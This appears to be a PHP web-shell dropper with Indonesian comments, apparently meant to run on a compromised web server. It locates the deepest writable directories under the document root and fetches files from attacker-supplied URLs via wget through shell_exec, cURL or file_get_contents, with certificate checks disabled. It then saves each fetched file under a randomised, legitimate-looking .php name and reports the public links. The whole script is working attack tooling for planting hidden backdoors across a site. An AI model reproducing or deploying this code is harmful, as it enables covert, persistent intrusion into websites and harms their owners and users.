// ==================== FUNGSI BUAT NAMA RANDOM UNIK TANPA ANGKA ====================
function generateRandomName($usedNames = []) {
    global $system_names;
    
    $prefixes = ['v2', 'beta', 'stable', 'dev', 'prod', 'core', 'main', 'backup', 'new', 'legacy', 'ultimate', 'premium'];
    $suffixes = ['v2', 'beta', 'stable', 'dev', 'prod', 'core', 'main', 'backup', 'new', 'legacy', 'final', 'latest', 'plus', 'pro'];
    
    $maxAttempts = 50;
    for ($i = 0; $i < $maxAttempts; $i++) {
        $baseName = $system_names[array_rand($system_names)];
        
        $usePrefix = rand(0, 2) === 1;
        $useSuffix = rand(0, 2) === 1;
        
        $name = $baseName;
        
        if ($usePrefix && !empty($prefixes)) {
            $prefix = $prefixes[array_rand($prefixes)];
            $name = $prefix . '_' . $name;
        }
        
        if ($useSuffix && !empty($suffixes)) {
            $suffix = $suffixes[array_rand($suffixes)];
            if ($usePrefix && $suffix == $prefix) {
                $suffixes2 = array_diff($suffixes, [$prefix]);
                if (!empty($suffixes2)) {
                    $suffix = $suffixes2[array_rand($suffixes2)];
                }
            }
            $name = $name . '_' . $suffix;
        }
        
        if (!in_array($name, $usedNames)) {
            return $name . '.php';
        }
    }
    
    $name1 = $system_names[array_rand($system_names)];
    $name2 = $system_names[array_rand($system_names)];
    $uniqueName = $name1 . '_' . $name2;
    
    if (!in_array($uniqueName, $usedNames)) {
        return $uniqueName . '.php';
    }
    
    return $name1 . '_copy.php';
}

// ==================== FUNGSI SCAN DIREKTORI PALING DALAM ====================
function getDeepestDirs($path, $depth = 0, $maxDepth = 8) {
    $result = [];
    if (!is_dir($path) || !is_readable($path)) return $result;
    
    $items = @scandir($path);
    if (!$items) return $result;
    
    $subdirs = [];
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $path . '/' . $item;
        if (is_dir($full) && !is_link($full)) {
            $subdirs[] = $full;
        }
    }
    
    if (empty($subdirs)) {
        $result[] = $path;
    } elseif ($depth < $maxDepth) {
        foreach ($subdirs as $sub) {
            $deeper = getDeepestDirs($sub, $depth + 1, $maxDepth);
            $result = array_merge($result, $deeper);
        }
    } else {
        $result[] = $path;
    }
    return $result;
}

// ==================== DETEKSI APAKAH shell_exec TERSEDIA ====================
function isShellExecAvailable() {
    if (!function_exists('shell_exec')) return false;
    
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $disabledList = array_map('trim', explode(',', $disabled));
        if (in_array('shell_exec', $disabledList)) return false;
    }
    return true;
}

// ==================== FUNGSI DOWNLOAD VIA WGET / FALLBACK ====================
function wgetDownload($url, $targetPath) {
    // Cek apakah shell_exec tersedia
    if (isShellExecAvailable()) {
        // Coba deteksi path wget
        $wgetPath = 'wget';
        $whichResult = @shell_exec('which wget 2>/dev/null');
        if (!empty($whichResult)) {
            $wgetPath = trim($whichResult);
        }
        
        // Coba beberapa varian command
        $urlEsc = escapeshellarg($url);
        $targetEsc = escapeshellarg($targetPath);
        
        $commands = [
            "$wgetPath -q --no-check-certificate --timeout=30 -O $targetEsc $urlEsc 2>&1",
            "wget -q --no-check-certificate --timeout=30 -O $targetEsc $urlEsc 2>&1",
        ];
        
        foreach ($commands as $cmd) {
            @shell_exec($cmd);
            clearstatcache(true, $targetPath);
            if (file_exists($targetPath) && filesize($targetPath) > 0) {
                return true;
            }
        }
    }
    
    // ========== FALLBACK 1: cURL ==========
    if (function_exists('curl_init')) {
        $fp = @fopen($targetPath, 'w');
        if ($fp) {
            $ch = @curl_init($url);
            @curl_setopt($ch, CURLOPT_FILE, $fp);
            @curl_setopt($ch, CURLOPT_HEADER, 0);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $ok = @curl_exec($ch);
            @curl_close($ch);
            @fclose($fp);
            clearstatcache(true, $targetPath);
            if ($ok && file_exists($targetPath) && filesize($targetPath) > 0) {
                return true;
            }
        }
    }
    
    // ========== FALLBACK 2: file_get_contents ==========
    $ctx = @stream_context_create([
        'http' => [
            'timeout' => 60,
            'user_agent' => 'Mozilla/5.0',
            'follow_location' => 1,
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ]
    ]);
    
    $content = @file_get_contents($url, false, $ctx);
    if ($content !== false && strlen($content) > 0) {
        return @file_put_contents($targetPath, $content) !== false;
    }
    
    // ========== FALLBACK 3: fopen ==========
    $src = @fopen($url, 'r', false, $ctx);
    if ($src) {
        $dst = @fopen($targetPath, 'w');
        if ($dst) {
            @stream_copy_to_stream($src, $dst);
            @fclose($dst);
            @fclose($src);
            clearstatcache(true, $targetPath);
            if (file_exists($targetPath) && filesize($targetPath) > 0) {
                return true;
            }
        } else {
            @fclose($src);
        }
    }
    
    return false;
}

// ==================== LOKASI SCAN ====================
$scanPaths = [__DIR__, $_SERVER['DOCUMENT_ROOT']];
$allDirs = [];
foreach ($scanPaths as $path) {
    if (!empty($path) && file_exists($path)) {
        $dirs = getDeepestDirs($path);
        $allDirs = array_merge($allDirs, $dirs);
    }
}
$allDirs = array_values(array_unique($allDirs));
$totalDirs = count($allDirs);

// ==================== PROSES UPLOAD ====================
$uploadResults = [];
$summary = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload'])) {
    $numDirs = isset($_POST['num_dirs']) ? intval($_POST['num_dirs']) : 0;
    $selectedDirs = isset($_POST['dirs']) ? $_POST['dirs'] : [];
    $urlsInput = isset($_POST['urls']) ? trim($_POST['urls']) : '';
    
    if (empty($selectedDirs) && $numDirs > 0 && $numDirs <= $totalDirs) {
        shuffle($allDirs);
        $selectedDirs = array_slice($allDirs, 0, $numDirs);
    }
    
    $selectedCount = count($selectedDirs);
    
    // Parse URL (satu per baris)
    $urls = [];
    if (!empty($urlsInput)) {
        $lines = preg_split('/\r\n|\r|\n/', $urlsInput);
        foreach ($lines as $line) {
            $line = trim($line);
            if (!empty($line) && filter_var($line, FILTER_VALIDATE_URL)) {
                $urls[] = $line;
            }
        }
    }
    
    if (empty($selectedDirs)) {
        $uploadResults[] = ['error' => true, 'msg' => 'Pilih direktori atau masukkan jumlah!'];
    } elseif (empty($urls)) {
        $uploadResults[] = ['error' => true, 'msg' => 'Masukkan minimal 1 URL yang valid!'];
    } else {
        $totalUploads = 0;
        $allLinks = [];
        $usedNames = [];
        
        foreach ($urls as $url) {
            // Ambil nama file dari URL
            $urlPath = parse_url($url, PHP_URL_PATH);
            $origName = basename($urlPath);
            if (empty($origName)) $origName = 'file';
            
            foreach ($selectedDirs as $dir) {
                // Pastikan direktori writable
                if (!is_writable($dir)) {
                    $uploadResults[] = [
                        'error' => true,
                        'msg' => "Direktori tidak writable: $dir"
                    ];
                    continue;
                }
                
                // Generate nama unik
                $randName = generateRandomName($usedNames);
                $usedNames[] = str_replace('.php', '', $randName);
                
                $target = $dir . '/' . $randName;
                
                if (wgetDownload($url, $target)) {
                    $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target);
                    $rel = str_replace('\\', '/', $rel);
                    $urlResult = $domain . $rel;
                    
                    $uploadResults[] = [
                        'original' => $origName,
                        'source_url' => $url,
                        'saved_as' => $randName,
                        'directory' => $dir,
                        'url' => $urlResult
                    ];
                    $allLinks[] = $urlResult;
                    $totalUploads++;
                } else {
                    $uploadResults[] = [
                        'error' => true,
                        'msg' => "Gagal download: $url ke $dir"
                    ];
                }
            }
        }
        
        $summary = [
            'total_uploads' => $totalUploads,
            'total_files' => count($urls),
            'total_dirs' => $selectedCount,
            'all_links' => $allLinks
        ];
    }
}

